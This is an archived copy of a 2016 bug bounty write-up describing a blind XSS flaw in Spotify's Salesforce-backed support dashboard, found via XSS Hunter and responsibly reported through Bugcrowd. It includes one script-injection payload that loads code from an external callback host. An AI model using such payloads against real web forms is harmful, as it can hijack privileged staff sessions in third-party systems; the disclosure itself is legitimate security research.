---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-07-19_blind-xss-in-spotifys-salesforce-integration.md
original_filename: 2016-07-19_blind-xss-in-spotifys-salesforce-integration.md
title: Blind XSS in Spotify's Salesforce Integration
category: documents
detected_topics:
- xss
- command-injection
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- cloud-security
language: en
raw_sha256: 3e9cc9b9207a60d4c99cab842b7d10d21d8cf0d1ea086c1386adde454781d830
text_sha256: 9d602b8232307f77df3b85218253b747f53f611e2f6a3e3f065b6bdd00a11165
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Blind XSS in Spotify's Salesforce Integration

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-07-19_blind-xss-in-spotifys-salesforce-integration.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cloud-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `3e9cc9b9207a60d4c99cab842b7d10d21d8cf0d1ea086c1386adde454781d830`
- Text SHA256: `9d602b8232307f77df3b85218253b747f53f611e2f6a3e3f065b6bdd00a11165`


## Content

---
title: "Blind XSS in Spotify's Salesforce Integration"
page_title: "Blind XSS in Spotify's Salesforce Integration | Mohammed Diaa"
url: "https://mhmdiaa.com/blog/spotify-blind-xss/"
final_url: "https://mhmdiaa.com/blog/spotify-blind-xss/"
authors: ["Mohammed Diaa (@mhmdiaa)"]
programs: ["Spotify"]
bugs: ["Blind XSS", "Salesforce"]
publication_date: "2016-07-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6279
---

#  Blind XSS in Spotify's Salesforce Integration 

July 19, 2016 

This is the story of a blind XSS vulnerability that affected Spotify. It could have allowed an attacker to gain access to their customer support backend, which is built on Salesforce.

First, some background.

### What is a “blind XSS vulnerability”?#

Blind XSS is a type of persistent XSS that occurs when the attacker can’t see where their payload has fired. That is when a user’s unsanitized input is displayed on a page that is only accessible to users who have specific privileges, such as feedback, contact, and logging dashboards.

### How would I know if my payload worked if I can’t see the page?#

Here comes [XSS Hunter](https://xsshunter.com/) to the rescue! It’s an awesome web app that Matthew Bryant [@IAmMandatory](https://twitter.com/IAmMandatory) built. It has a lot of [features](https://xsshunter.com/features) that can help a lot in the process of finding blind XSS vulnerabilities and showing their impact. Also, Matt’s [many](https://thehackerblog.com/xss-hunter-a-modern-approach-to-testing-for-cross-site-scripting-xss/) [great](https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/) [posts](https://thehackerblog.com/xss-hunter-is-now-open-source-heres-how-to-set-it-up/) were my (and many other people’s) introduction to this type of bug. I highly recommend you give them a read. Thanks, Matt!

### How did this affect Spotify?#

It was pretty straightforward. Spotify had a standard contact page where users can report problems and send suggestions. I sent a query with a very simple XSS payload. 
  
  
  "><script src=https://[username].xss.ht></script>

A few minutes later, I received an email from XSS Hunter informing me that the payload had fired. At first, I wasn’t sure where to report this; the payload fired in a Salesforce domain that Spotify was using as a support platform, so which one of them can fix it? Eventually, I reported it to Spotify via their Bugcrowd and asked them to inform Salesforce about it. It turned out that the vulnerability existed due to a custom Salesforce view that Spotify was using, so it wasn’t Salesforce’s mistake per se. A few days later, Spotify fixed the vulnerability and issued a reward.
